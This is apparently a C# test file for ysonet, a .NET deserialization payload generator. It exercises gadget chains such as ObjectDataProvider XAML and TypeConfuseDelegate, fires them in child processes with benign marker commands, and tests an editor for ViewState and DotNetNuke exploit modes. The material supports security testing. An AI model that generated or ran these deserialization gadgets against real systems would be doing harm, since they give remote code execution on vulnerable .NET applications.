                    if (!proc.WaitForExit(40000)) { try { proc.Kill(); } catch { } }
                }
                return WaitForFile(marker, waitMs);
            }
            finally { SafeDelete(marker); }
        }

        // The child half of the probe: build one XAML-container payload whose XAML drops the
        // marker, deserialize it on an STA thread (with or without the blocking binder), and
        // exit. The process may fail-fast inside the CLR after firing; the parent reads the
        // marker, never the exit code.
        private static int XamlContainerProbe(string spec)
        {
            string[] parts = spec.Split('|');
            int container = int.Parse(parts[0]);
            bool useBinder = parts[1] == "1";
            string marker = parts[2];

            byte[] payload = BfBytes(TypeConfuseDelegateGenerator.GetXamlGadget(MarkerXaml(marker), container));
            RunSTA(delegate
            {
                if (useBinder)
                {
                    DeserializeWithBinder(payload, new SortedSetNameBlockingBinder());
                }
                else
                {
                    var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                    using (var ms = new MemoryStream(payload)) bf.Deserialize(ms);
                }
            });
            // Give the spawned "cmd /c echo" a moment before this process goes away.
            System.Threading.Thread.Sleep(500);
            return 0;
        }

        // A XAML document that drops a marker file when parsed: the ObjectDataProvider
        // ResourceDictionary payload, the same shape both consumers carry.
        private static string MarkerXaml(string marker)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = MarkerCommand(marker);
            ia.IsRawCmd = true;
            ia.Test = false;
            var gen = new ObjectDataProviderGenerator();
            gen.Options().Parse(new[] { "--variant", "2" });
            return (string)gen.Generate("xaml", ia);
        }

        // The container belongs to the TypeConfuseDelegate wrapper only. With the
        // TextFormattingRunProperties wrapper (variant 2) there is no sorted container at all,
        // so the option is accepted and simply ignored - it must never change those bytes.
        private static void XamlContainerIsIgnoredByTheTfrpWrapper()
        {
            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter" })
            {
                RunResult plain = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 2, null, formatter, false);
                AssertTrue(plain.Success, "the TFRP wrapper generates on " + formatter + ": " + plain.ErrorMessage);

                foreach (int container in new[] { 1, 2, 3 })
                {
                    RunResult withContainer = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 2, container, formatter, false);
                    AssertTrue(withContainer.Success,
                        "the TFRP wrapper accepts --rootcontainer " + container + " on " + formatter + ": " + withContainer.ErrorMessage);
                    AssertTrue(BytesEqual(Bytes(plain.Raw), Bytes(withContainer.Raw)),
                        "--rootcontainer " + container + " does not change the TFRP wrapper payload on " + formatter);
                }
            }
        }

        // Formatter-expansion result, locked as a test instead of left as an assumption. The
        // container swap does not widen the formatter set of these consumers: all three roots
        // are GENERIC types (SortedSet`1, SortedDictionary`2, TreeSet`1) and SoapFormatter
        // cannot serialize a generic type, so variant 1 stays opted out for every container.
        // Asserted rather than silently omitted, so a framework or serializer change that
        // lifts the limitation says so here.
        private static void XamlContainersCannotUseSoapFormatter()
        {
            foreach (string gadget in XamlContainerGadgets)
            {
                foreach (int container in new[] { 1, 2, 3 })
                {
                    // The variant+formatter guard runs before any .cs compile, so this stays
                    // cheap for XamlAssemblyLoadFromFile too.
                    RunResult r = GenerateXamlContainer(gadget, "ysonet_no_such_fixture.cs", 1, container, "SoapFormatter", false);
                    AssertTrue(!r.Success,
                        gadget + " variant 1 + --rootcontainer " + container + " cannot use SoapFormatter");
                    AssertTrue((r.ErrorMessage ?? "").IndexOf("is not supported by variant 1", StringComparison.OrdinalIgnoreCase) >= 0,
                        gadget + " --rootcontainer " + container + " reports the variant opt-out: " + r.ErrorMessage);
                }
            }
        }

        // The root container is a plain gadget option, exactly like ObjectDataProvider's
        // --xamlurl: it must NOT appear as a variant, must start unset (so the default
        // payload is unchanged), and must reach the echoed command line as
        // --rootcontainer N.
        private static void EditorExposesTheXamlContainerOption()
        {
            foreach (string gadget in XamlContainerGadgets)
            {
                AssertEqual(2, Gadget(gadget).Variants().Count,
                    gadget + " still declares two WRAPPER variants (the container is not one)");

                var ed = new ModuleEditor(null, null, true, null, null);
                var fields = ed.BuildFieldsForTest(gadget);

                EditableField container = FindEditable(fields, RootContainerOption);
                AssertTrue(container != null, "the " + RootContainerOption + " setting is offered for " + gadget);
                AssertTrue(container.ModuleOwn, "the " + RootContainerOption + " setting belongs to " + gadget);

                EditableField variant = FindEditable(fields, "variant");
                AssertTrue(variant != null && !ReferenceEquals(variant, container),
                    "the container is a separate setting from the wrapper variant (" + gadget + ")");
                AssertTrue(string.IsNullOrEmpty(container.Value),
                    "the container starts unset, so the default payload stays the shipped one (" + gadget + ")");

                EditableField command = FindEditable(fields, "command");
                if (command != null) command.Value = "calc.exe";

                container.Value = "3";
                string line = ed.GadgetCommandLineForTest();
                AssertTrue(line.Contains(RootContainerFlag + " 3"),
                    "the echoed command line carries the container: " + line);
            }
        }

        // A variant can declare which of the gadget's own options it does not use
        // (GadgetVariant.WithoutOptions), the gadget-side counterpart of a plugin mode's
        // option list. The data model must default to "every option applies", so the
        // gadgets that declare nothing - almost all of them - are untouched.
        private static void VariantOptionScopeDataModel()
        {
            var plain = new GadgetVariant(1, "plain");
            AssertTrue(plain.UnusedOptions.Count == 0, "a variant declares no unused option by default");
            AssertTrue(plain.UsesOption("anything"), "a variant with no declaration uses every option");
            AssertTrue(plain.UsesOption(null), "a null option name is not treated as excluded");

            var scoped = new GadgetVariant(2, "scoped").WithoutOptions("rootcontainer", "");
            AssertEqual(1, scoped.UnusedOptions.Count, "an empty name is ignored, a real one is kept");
            AssertTrue(!scoped.UsesOption("rootcontainer"), "the declared option is excluded");
            AssertTrue(!scoped.UsesOption("RootContainer"), "the match is case-insensitive");
            AssertTrue(scoped.UsesOption("variant"), "an undeclared option still applies");

            // The wiring: the TFRP wrapper of both consumers is the only declaration today.
            foreach (string gadget in XamlContainerGadgets)
            {
                var variants = Gadget(gadget).Variants();
                AssertTrue(variants[0].UsesOption(RootContainerOption),
                    gadget + " variant 1 (TypeConfuseDelegate wrapper) uses the root container");
                AssertTrue(!variants[1].UsesOption(RootContainerOption),
                    gadget + " variant 2 (TextFormattingRunProperties wrapper) declares it unused");
            }
        }

        // The editor must act on that declaration: with the TFRP wrapper selected the
        // setting disappears, and a value left over from the other wrapper must NOT reach
        // the command line. Switching back brings it and its value back.
        private static void EditorHidesAnOptionTheVariantDoesNotUse()
        {
            foreach (string gadget in XamlContainerGadgets)
            {
                var ed = new ModuleEditor(null, null, true, null, null);
                var fields = ed.BuildFieldsForTest(gadget);
                EditableField command = FindEditable(fields, "command");
                if (command != null) command.Value = "calc.exe";

                EditableField variant = FindEditable(fields, "variant");
                EditableField container = FindEditable(fields, RootContainerOption);
                var declared = Gadget(gadget).Variants();

                // Variant 1: visible, and it reaches the command line.
                variant.Value = declared[0].Label;
                container.Value = "2";
                string withWrapper = ed.GadgetCommandLineForTest();
                AssertTrue(!container.Hidden, gadget + " shows the container for the TCD wrapper");
                AssertTrue(withWrapper.Contains(RootContainerFlag + " 2"),
                    gadget + " emits the container for the TCD wrapper: " + withWrapper);

                // Variant 2: hidden, and the carried-over value is dropped.
                variant.Value = declared[1].Label;
                string tfrpLine = ed.GadgetCommandLineForTest();
                AssertTrue(container.Hidden, gadget + " hides the container for the TFRP wrapper");
                AssertTrue(!tfrpLine.Contains(RootContainerFlag),
                    gadget + " does not emit the container for the TFRP wrapper: " + tfrpLine);

                // Back again: the setting and its value return, so hiding never destroys input.
                variant.Value = declared[0].Label;
                string backLine = ed.GadgetCommandLineForTest();
                AssertTrue(!container.Hidden, gadget + " shows the container again for the TCD wrapper");
                AssertTrue(backLine.Contains(RootContainerFlag + " 2"),
                    gadget + " keeps the container value across a variant round trip: " + backLine);
            }

            // A gadget whose variants declare nothing keeps every option visible, for every
            // variant. ObjectDataProvider has four variants and one plain option.
            var odpEd = new ModuleEditor(null, null, true, null, null);
            var odpFields = odpEd.BuildFieldsForTest("ObjectDataProvider");
            EditableField xamlurl = FindEditable(odpFields, "xamlurl");
            EditableField odpVariant = FindEditable(odpFields, "variant");
            AssertTrue(xamlurl != null && odpVariant != null, "ObjectDataProvider offers xamlurl and variant");
            foreach (GadgetVariant v in Gadget("ObjectDataProvider").Variants())
            {
                odpVariant.Value = v.Label;
                odpEd.RefreshDynamicForTest();
                AssertTrue(!xamlurl.Hidden,
                    "ObjectDataProvider variant " + v.Number + " declares no unused option, so xamlurl stays visible");
            }
        }

        // The XAML wrapper payload fires INSIDE a deserialization callback and then
        // fail-fasts the CLR, so -t used to kill ysonet.exe with no message right after
        // printing the payload. The gadget now declares SelfTestNeedsChildProcess, which
        // routes the self-test through a child ysonet process. The proof is that this
        // process is still alive to assert afterwards: before the fix, generating with
        // Test=true here took the whole test runner down.
        private static void XamlWrapperSelfTestSurvivesTheHostProcess()
        {
            var gen = GadgetRegistry.CreateGadgetInstance("ActivitySurrogateDisableTypeCheck") as GenericGenerator;
            AssertTrue(gen != null, "the gadget loads");

            InputArgs probe = new InputArgs();
            probe.Cmd = "calc.exe";
            probe.Test = true;
            AssertTrue(gen.SelfTestNeedsChildProcess("BinaryFormatter", probe),
                "variant 1 declares that its self-test needs a child process");

            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";     // ignored by this gadget
            ia.Test = true;          // the whole point: run the self-test
            RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "ActivitySurrogateDisableTypeCheck",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = ia,
            });

            AssertTrue(r.Success, "the payload is still produced with -t: " + r.ErrorMessage);
            AssertTrue(!RawIsEmpty(r.Raw), "the payload is non-empty with -t");

            // The TFRP wrapper does not need isolation, and asking for it must not have
            // leaked onto every gadget.
            var tfrp = GadgetRegistry.CreateGadgetInstance("ActivitySurrogateDisableTypeCheck") as GenericGenerator;
            tfrp.Options().Parse(new[] { "--variant", "2" });
            AssertTrue(!tfrp.SelfTestNeedsChildProcess("BinaryFormatter", probe),
                "the TextFormattingRunProperties wrapper self-tests in-process as before");
            AssertTrue(!((GenericGenerator)GadgetRegistry.CreateGadgetInstance("TypeConfuseDelegate")).SelfTestNeedsChildProcess("BinaryFormatter", probe),
                "an ordinary gadget still self-tests in-process");
        }

        // The isolated self-test deserializes in a child process with a PLAIN formatter, so
        // a gadget that installs its own SerializationBinder (PSObject's LocalBinder resolves
        // the bundled vulnerable assembly, which a plain deserialize would miss) would be
        // tested against different types than it ships. GenericGenerator refuses that pair
        // outright rather than reporting a self-test that proved something else. No real
        // gadget combines them, so the guard is proven with a fake that deliberately does.
        private static void IsolatedSelfTestRefusesACustomBinder()
        {
            var fake = new ysonet.Tests.Helpers.TestingArena.IsolatedSelfTestWithBinderFakeGenerator();

            InputArgs noTest = new InputArgs();
            noTest.Test = false;
            object payload = fake.Generate("BinaryFormatter", noTest);
            AssertTrue(!RawIsEmpty(payload), "without -t the pair is irrelevant and the payload is produced");

            InputArgs withTest = new InputArgs();
            withTest.Test = true;
            Exception caught = null;
            try { new ysonet.Tests.Helpers.TestingArena.IsolatedSelfTestWithBinderFakeGenerator().Generate("BinaryFormatter", withTest); }
            catch (Exception ex) { caught = ex; }

            AssertTrue(caught != null, "-t on a binder + isolated self-test pair is refused");
            AssertTrue(caught.Message.IndexOf("SerializationBinder", StringComparison.OrdinalIgnoreCase) >= 0,
                "the refusal names the reason: " + caught.Message);

            // And the real gadgets that DO use isolation install no binder, so none of them
            // can hit that refusal.
            InputArgs probe = new InputArgs();
            probe.Cmd = "calc.exe";
            probe.Test = false;
            foreach (string gadget in XamlContainerGadgets)
            {
                var g = GadgetRegistry.CreateGadgetInstance(gadget) as GenericGenerator;
                AssertTrue(g.SelfTestNeedsChildProcess("BinaryFormatter", probe),
                    gadget + " uses the isolated self-test");
                AssertTrue(g.serializationBinder == null,
                    gadget + " installs no SerializationBinder, so the isolated self-test is valid for it");
            }
        }

        private static void OptionHeuristics()
        {
            // Choices pulled from an enumerating description.
            var alg = EditableField.ParseChoices("The encryption algorithm can be set to DES, 3DES, or AES. Default: AES.");
            AssertTrue(alg != null && alg.Count == 3, "three algorithms parsed");
            AssertEqual("DES", alg[0], "first choice");
            AssertEqual("AES", alg[2], "last choice");

            // Single-quoted tokens (delivery modes) become choices.
            var modes = EditableField.ParseChoices("'winforms' (default) or 'wpfxaml': two delivery modes");
            AssertTrue(modes != null && modes.Contains("winforms") && modes.Contains("wpfxaml"), "quoted modes parsed");

            // A default token is recovered.
            AssertEqual("AES", EditableField.ParseDefault("... can be DES, 3DES, or AES. Default: AES."), "default AES");
            AssertEqual("winforms", EditableField.ParseDefault("delivery mode. Default: winforms"), "default winforms");
            AssertEqual("", EditableField.ParseDefault("no default mentioned here"), "no default -> empty");

            // Required inference: value option with no default/ignored/optional.
            AssertTrue(EditableField.LooksRequired("The validationKey from machineKey.", true), "no-default value option looks required");
            AssertTrue(!EditableField.LooksRequired("Gadget chain. Default: ActivitySurrogateSelector.", true), "with-default is not required");
            AssertTrue(!EditableField.LooksRequired("A flag.", false), "flags are never required");
            AssertTrue(!EditableField.LooksRequired("Validate and decrypt the viewstate if it has been encrypted.", true), "conditional (if) is not required");
        }

        private static void EditorPluginFields()
        {
            // The editor turns a plugin's OptionSet into editable fields, recovering
            // defaults and choices, and offers a gadget picker for the gadget option.
            var editor = new ModuleEditor(null, null, false, null, null);
            var fields = editor.BuildFieldsForTest("ViewState");

            EditableField gadget = FindEditable(fields, "gadget");
            AssertTrue(gadget != null && gadget.Kind == FieldKind.Pick, "gadget option is a picker");
            AssertTrue(gadget.Choices != null && gadget.Choices.Contains("TypeConfuseDelegate"), "gadget picker lists gadgets");
            AssertEqual("ActivitySurrogateSelector", gadget.Value, "gadget defaults to ActivitySurrogateSelector");

            EditableField valg = FindEditable(fields, "validationalg");
            AssertTrue(valg != null && valg.Kind == FieldKind.Choice, "validationalg is a choice");
            AssertTrue(valg.Choices.Contains("HMACSHA256"), "validationalg choices parsed from help");
            AssertTrue(valg.AllowCustom, "a choice still allows a custom value");

            EditableField vkey = FindEditable(fields, "validationkey");
            AssertTrue(vkey != null && vkey.Required, "validationkey is flagged required");

            // Output controls and a Generate action are always present.
            AssertTrue(FindEditable(fields, "output") != null, "output format field present");
            bool hasGenerate = false;
            foreach (EditableField f in fields)
                if (f.IsAction) hasGenerate = true;
            AssertTrue(hasGenerate, "a Generate action row is present");
        }

        private static EditableField FindEditable(List<EditableField> fields, string label)
        {
            foreach (EditableField f in fields)
                if (string.Equals(f.Label, label, StringComparison.OrdinalIgnoreCase))
                    return f;
            return null;
        }

        private static EditableField FindAction(List<EditableField> fields, string actionId)
        {
            foreach (EditableField f in fields)
                if (f.IsAction && string.Equals(f.ActionId, actionId, StringComparison.OrdinalIgnoreCase))
                    return f;
            return null;
        }

        private static void EditorActionsAndOwnership()
        {
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest("ObjectDataProvider");

            // Generate, copy-to-clipboard, and show-command actions are all offered.
            AssertTrue(FindAction(fields, "generate") != null, "generate action present");
            AssertTrue(FindAction(fields, "clipboard") != null, "copy-to-clipboard action present");
            AssertTrue(FindAction(fields, "showcmd") != null, "show-command action present");

            // Built-ins are not module-own; the gadget's own options (e.g. variant) are.
            AssertTrue(!FindEditable(fields, "formatter").ModuleOwn, "formatter is a shared built-in");
            AssertTrue(!FindEditable(fields, "output").ModuleOwn, "output is a shared built-in");
            EditableField variant = FindEditable(fields, "variant");
            AssertTrue(variant != null && variant.ModuleOwn, "variant is a gadget-specific option");
        }

        private static void ChoiceDetection()
        {
            // Colon-introduced list, keeping a dotted token intact (System.String).
            var fmt = EditableField.ParseChoices("The object format: Csv, PenData, System.String, WaveAudio. Default: PenData");
            AssertTrue(fmt != null && fmt.Count == 4, "colon list of four tokens");
            AssertTrue(fmt.Contains("System.String"), "dotted token kept whole");

            // Numbered options -> the numbers.
            var num = EditableField.ParseChoices("XAML variant: 1 = bare, 2 = wrapper. Default: 2");
            AssertTrue(num != null && num.Count == 2 && num[0] == "1" && num[1] == "2", "numbered choices 1,2");

            // Quoted lowercase modes, ignoring a quoted CamelCase format name.
            var mode = EditableField.ParseChoices("mode. 'winforms' (default) under the 'Xaml' format, or 'wpfxaml'. Default: winforms");
            AssertTrue(mode != null && mode.Count == 2, "two lowercase modes");
            AssertTrue(mode.Contains("winforms") && mode.Contains("wpfxaml") && !mode.Contains("Xaml"), "CamelCase 'Xaml' excluded");

            // And the real Clipboard plugin options come through as selects. Clipboard
            // declares modes, so 'mode' is the mode picker (two delivery modes) and the
            // inner xamlvariant is a choice shown in the wpfxaml mode.
            var editor = new ModuleEditor(null, null, false, null, null);
            var fields = editor.BuildFieldsForTest("Clipboard");
            EditableField modeField = FindEditable(fields, "mode");
            AssertTrue(modeField != null && modeField.Kind == FieldKind.Choice, "Clipboard mode is a choice");
            AssertTrue(modeField.Choices.Count == 2, "two delivery modes offered");
            EditableField xv = FindEditable(fields, "xamlvariant");
            AssertTrue(xv != null && xv.Kind == FieldKind.Choice, "xamlvariant is a choice");
        }

        private static void BridgedChainChoices()
        {
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest("ObjectDataProvider");
            EditableField bgc = FindEditable(fields, "bridgedgadgetchain");
            AssertTrue(bgc != null && bgc.Kind == FieldKind.Choice, "bridged chain is a choice");
            AssertTrue(bgc.AllowCustom, "still allows a custom comma-separated chain");
            AssertTrue(bgc.Choices != null && bgc.Choices.Count > 0, "offers bridge-capable gadgets");
        }

        private static void VariantSwitchResetsCommand()
        {
            // XamlImageInfo v1 reads a file path, v2 runs a shell command. A command
            // typed under the shell variant must NOT survive a switch to the file
            // variant (where it would silently be used as a file path).
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest("XamlImageInfo");
            EditableField variant = FindEditable(fields, "variant");
            EditableField command = FindEditable(fields, "command");
            AssertTrue(variant != null && command != null, "variant and command fields present");
            // The variant field is bound to its labels, in variant order (v1, v2).
            AssertTrue(variant.Choices != null && variant.Choices.Count == 2, "two variant labels");
            string v1Label = variant.Choices[0]; // v1 = file path
            string v2Label = variant.Choices[1]; // v2 = shell command

            // Select the shell-command variant and set a command.
            variant.Value = v2Label;
            editor.RefreshDynamicForTest();
            command.Value = "whoami";
            editor.RefreshDynamicForTest(); // stable type: the value is kept
            AssertEqual("whoami", editor.CommandValueForTest, "command kept while type is unchanged");

            // Switch to the file-path variant: the stale shell command is cleared.
            variant.Value = v1Label;
            editor.RefreshDynamicForTest();
            AssertEqual("", editor.CommandValueForTest, "command reset when the input type changes");
        }

        private static void OptionsPersistAndReset()
        {
            // One session shared across module loads (this is what the real editor
            // uses to carry values between modules).
            var session = new WizardSession();
            var editor = new ModuleEditor(null, null, false, null, session);

            // Change a shared setting (outputpath) in one plugin, as an edit would.
            var vs = editor.BuildFieldsForTest("ViewState");
            EditableField op = FindEditable(vs, "outputpath");
            AssertTrue(op != null, "outputpath present");
            op.Value = "out.bin"; op.Touched = true;

            // Open a different plugin: the same setting pre-fills from memory.
            var dnn = editor.BuildFieldsForTest("DotNetNuke");
            AssertEqual("out.bin", FindEditable(dnn, "outputpath").Value,
                "a changed setting persists to another module that has it");

            // Reset restores this module's defaults (outputpath default is empty).
            editor.ResetToDefaultsForTest();
            AssertEqual("", FindEditable(editor.CurrentFieldsForTest, "outputpath").Value,
                "reset returns settings to their defaults");

            // Reset also drops the remembered value, so it no longer propagates.
            var vs2 = editor.BuildFieldsForTest("ViewState");
            AssertEqual("", FindEditable(vs2, "outputpath").Value,
                "reset cleared the remembered value too");

            // An untouched default must NOT propagate (no clobbering other defaults).
            var session2 = new WizardSession();
            var editor2 = new ModuleEditor(null, null, false, null, session2);
            editor2.BuildFieldsForTest("ViewState");                 // nothing touched
            var dnn2 = editor2.BuildFieldsForTest("DotNetNuke");
            AssertEqual("", FindEditable(dnn2, "outputpath").Value,
                "untouched defaults do not leak into other modules");
        }

        private static void SingleFieldResetToDefault()
        {
            // A single setting can be reset to its default without rebuilding the whole
            // module. This backs both interactive gestures: Delete on a focused row, and
            // the "(reset to default)" entry inside a value's edit menu.
            var session = new WizardSession();
            var editor = new ModuleEditor(null, null, true, null, session);

            var g = editor.BuildFieldsForTest("ClaimsIdentity");

            // A Choice setting with a non-empty-default example: the bridged chain (bgc)
            // defaults to unset. Set it, then reset it back.
            EditableField bgc = FindEditable(g, "bridgedgadgetchain");
            AssertTrue(bgc != null, "bgc field present");
            AssertEqual("", bgc.DefaultValue, "bgc default is unset");
            bgc.Value = "TypeConfuseDelegate"; bgc.Touched = true;
            editor.ResetFieldToDefaultForTest(bgc);
            AssertEqual("", bgc.Value, "bgc reset to its default (unset)");
            AssertTrue(!bgc.Touched, "reset clears the touched flag");

            // The edit menu of a Choice offers a reset entry (this is the "enter on it
            // to unset" path).
            AssertTrue(ModuleEditor.EditorItemsForTest(bgc).Contains(ModuleEditor.ResetDefaultEntry),
                "the value editor offers a reset-to-default entry");

            // The command has a real (non-empty) default: resetting restores it.
            EditableField cmd = FindEditable(g, "command");
            AssertTrue(cmd != null && !string.IsNullOrEmpty(cmd.DefaultValue), "command has a default");
            string cmdDefault = cmd.DefaultValue;
            cmd.Value = "mspaint"; cmd.Touched = true;
            editor.ResetFieldToDefaultForTest(cmd);
            AssertEqual(cmdDefault, cmd.Value, "command reset to its default");

            // A remembered (cross-module) setting: reset also drops the remembered value
            // so it stops propagating to other modules.
            EditableField op = FindEditable(g, "outputpath");
            op.Value = "out.bin"; op.Touched = true;
            editor.SnapshotToMemoryForTest();
            editor.ResetFieldToDefaultForTest(op);
            AssertEqual("", op.Value, "outputpath reset to its default");
            var g2 = editor.BuildFieldsForTest("TypeConfuseDelegate");
            AssertEqual("", FindEditable(g2, "outputpath").Value,
                "reset dropped the remembered value, so it no longer propagates");
        }

        private static void BridgedChainShownOnlyForBridgeGadgets()
        {
            // The bridgedgadgetchain (--bgc) setting only makes sense when the edited
            // gadget can itself receive a bridged payload (the -g gadget is the outer
            // consumer). For any other gadget --bgc fails at generate, so the editor
            // must hide the field instead of offering a guaranteed failure.
            var session = new WizardSession();
            var editor = new ModuleEditor(null, null, true, null, session);

            // DataSet IS a bridge gadget (Bridged label + a bridge formatter): shown.
            var ds = editor.BuildFieldsForTest("DataSet");
            EditableField dsBgc = FindEditable(ds, "bridgedgadgetchain");
            AssertTrue(dsBgc != null && !dsBgc.Hidden, "bgc is shown for a bridge gadget (DataSet)");

            // Set a chain on the bridge gadget, as an edit would (this also remembers it
            // in the shared session for the cross-module check below).
            dsBgc.Value = "ClaimsIdentity"; dsBgc.Touched = true;

            // DataTable is a root carrier, not a bridge gadget: the field must be hidden.
            var dt = editor.BuildFieldsForTest("DataTable");
            EditableField dtBgc = FindEditable(dt, "bridgedgadgetchain");
            AssertTrue(dtBgc != null, "bgc field object is kept (non-null) even when hidden");
            AssertTrue(dtBgc.Hidden, "bgc is hidden for a non-bridge gadget (DataTable)");

            // Even though the chain was carried over in session memory, a non-bridge
            // gadget must never emit --bgc (it would fail at generate).
            string cmd = editor.GadgetCommandLineForTest();
            AssertTrue(cmd.IndexOf("--bgc", StringComparison.OrdinalIgnoreCase) < 0,
                "a hidden bgc is not emitted for a non-bridge gadget: " + cmd);
        }

        private static void CommandPersistsAcrossGadgets()
        {
            // Type a command in one gadget and switch to another WITHOUT generating:
            // the new gadget must show the typed command, not the old default. (The
            // bug: the command was only saved at generate time.)
            var session = new WizardSession();
            var editor = new ModuleEditor(null, null, true, null, session);

            var g1 = editor.BuildFieldsForTest("TypeConfuseDelegate");
            EditableField cmd = FindEditable(g1, "command");
            AssertTrue(cmd != null, "command field present");
            cmd.Value = "mspaint"; cmd.Touched = true;

            // Switching modules snapshots the current one, then seeds the next.
            var g2 = editor.BuildFieldsForTest("ClaimsIdentity");
            AssertEqual("mspaint", FindEditable(g2, "command").Value,
                "the typed command carried to another gadget without generating");

            // And back again shows the same, not the stale default.
            var g3 = editor.BuildFieldsForTest("TypeConfuseDelegate");
            AssertEqual("mspaint", FindEditable(g3, "command").Value,
                "the typed command is still there when returning to the first gadget");
        }

        private static void SettingsSharedGadgetToPlugin()
        {
            // Two separate editors (gadget + plugin) that share one session, exactly
            // like the real wizard. A setting changed in the gadget carries to a
            // plugin that has the same-named setting.
            var session = new WizardSession();

            var gEditor = new ModuleEditor(null, null, true, null, session);
            var g = gEditor.BuildFieldsForTest("TypeConfuseDelegate");
            EditableField gop = FindEditable(g, "outputpath");
            gop.Value = "shared.bin"; gop.Touched = true;
            gEditor.SnapshotToMemoryForTest(); // simulates leaving the gadget editor

            var pEditor = new ModuleEditor(null, null, false, null, session);
            var p = pEditor.BuildFieldsForTest("ViewState");
            AssertEqual("shared.bin", FindEditable(p, "outputpath").Value,
                "a setting changed in a gadget carries to a plugin with the same setting");
        }

        private static void ViewStateModeErrorIsActionable()
        {
            // Only a validationkey, no payload source: generation must fail with a
            // message that names what to set (not the old vague "mode" text), and it
            // must NOT kill the process.
            RunResult r = PayloadRunner.RunPlugin("ViewState",
                new string[] { "-p", "ViewState", "--validationkey=70DBADBFF4B7A13BE67DD0B11B177936" });
            AssertTrue(!r.Success, "fails without a payload source");
            string m = (r.ErrorMessage ?? "").ToLowerInvariant();
            AssertTrue(m.Contains("command") && m.Contains("dryrun") && m.Contains("unsignedpayload"),
                "the error names the payload-source options: " + r.ErrorMessage);

            // 'examples' must throw (caught) rather than exiting the process.
            RunResult ex = PayloadRunner.RunPlugin("ViewState",
                new string[] { "-p", "ViewState", "--examples" });
            AssertTrue(!ex.Success, "examples does not generate a payload");
            AssertTrue((ex.ErrorMessage ?? "").ToLowerInvariant().Contains("examples"),
                "examples reports a clear message instead of exiting: " + ex.ErrorMessage);
        }

        private static void ExamplesHiddenFromEditor()
        {
            var vs = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("ViewState");
            AssertTrue(FindEditable(vs, "examples") == null,
                "the informational 'examples' toggle is not shown in the settings editor");
            // Real payload options are still present.
            AssertTrue(FindEditable(vs, "validationkey") != null, "validationkey still shown");
            AssertTrue(FindEditable(vs, "mode") != null, "the mode picker is shown");
        }

        private static void PluginModesDriveOptions()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var vs = editor.BuildFieldsForTest("ViewState");

            EditableField mode = FindEditable(vs, "mode");
            AssertTrue(mode != null && mode.Kind == FieldKind.Choice, "a mode picker is shown");
            AssertTrue(mode.Choices != null && mode.Choices.Count == 3, "three modes offered");

            // Default mode = Exploit: command + validationkey required, gadget shown,
            // the defining 'dryrun' flag hidden (implied by the mode).
            EditableField command = FindEditable(vs, "command");
            EditableField vkey = FindEditable(vs, "validationkey");
            AssertTrue(command.Required, "exploit: command is required");
            AssertTrue(vkey.Required, "exploit: validationkey is required");
            AssertTrue(!FindEditable(vs, "gadget").Hidden, "exploit: gadget is shown");
            // dryrun is the mode-defining flag: driven by the picker, not shown as a field.
            AssertTrue(FindEditable(vs, "dryrun") == null, "exploit: dryrun is not a separate field (mode-driven)");
            AssertTrue(FindEditable(vs, "unsignedpayload").Hidden, "exploit: unsignedpayload is hidden");

            command.Value = "calc.exe"; command.Touched = true;
            vkey.Value = "ABC"; vkey.Touched = true;
            string exploitArgv = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(exploitArgv.Contains("--command") && exploitArgv.Contains("--validationkey"),
                "exploit argv passes command and validationkey: " + exploitArgv);
            AssertTrue(!exploitArgv.Contains("--dryrun"), "exploit argv has no --dryrun");
            AssertTrue(!exploitArgv.Contains("--unsignedpayload"), "exploit argv has no --unsignedpayload");

            // Switch to Dry run: only validationkey required; gadget/command hidden and
            // NOT passed; the --dryrun flag is passed instead.
            mode.Value = mode.Choices[1];
            editor.RefreshDynamicForTest();
            AssertTrue(FindEditable(vs, "validationkey").Required, "dryrun: validationkey required");
            AssertTrue(FindEditable(vs, "command").Hidden, "dryrun: command hidden");
            AssertTrue(FindEditable(vs, "gadget").Hidden, "dryrun: gadget hidden");
            string dryArgv = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(dryArgv.Contains("--dryrun"), "dryrun argv passes --dryrun: " + dryArgv);
            AssertTrue(!dryArgv.Contains("--command") && !dryArgv.Contains("--gadget"),
                "dryrun argv drops command and gadget: " + dryArgv);

            // A plugin without modes is unaffected: no mode picker.
            var at = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("ApplicationTrust");
            AssertTrue(FindEditable(at, "mode") == null, "a plugin without modes shows no mode picker");
        }

        private static void DotNetNukeModes()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var f = editor.BuildFieldsForTest("DotNetNuke");
            EditableField mode = FindEditable(f, "mode");
            AssertTrue(mode != null && mode.Choices.Count == 3, "three DotNetNuke modes");

            // Default = run_command: command required; url/file hidden.
            AssertTrue(FindEditable(f, "command").Required, "run_command: command required");
            AssertTrue(FindEditable(f, "url").Hidden && FindEditable(f, "file").Hidden, "run_command: url/file hidden");
            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a1.Contains("--mode run_command") && a1.Contains("--command"), "run_command argv: " + a1);
            AssertTrue(!a1.Contains("--url") && !a1.Contains("--file"), "run_command argv excludes url/file");
            RunResult r1 = PayloadRunner.RunPlugin("DotNetNuke", editor.PluginArgvForTest().ToArray());
            AssertTrue(r1.Success, "run_command generates via CLI args: " + r1.ErrorMessage);

            // Switch to write_file: file+url required and shown; command hidden.
            mode.Value = mode.Choices[2];
            editor.RefreshDynamicForTest();
            AssertTrue(FindEditable(f, "file").Required && FindEditable(f, "url").Required, "write_file: file+url required");
            AssertTrue(FindEditable(f, "command").Hidden, "write_file: command hidden");
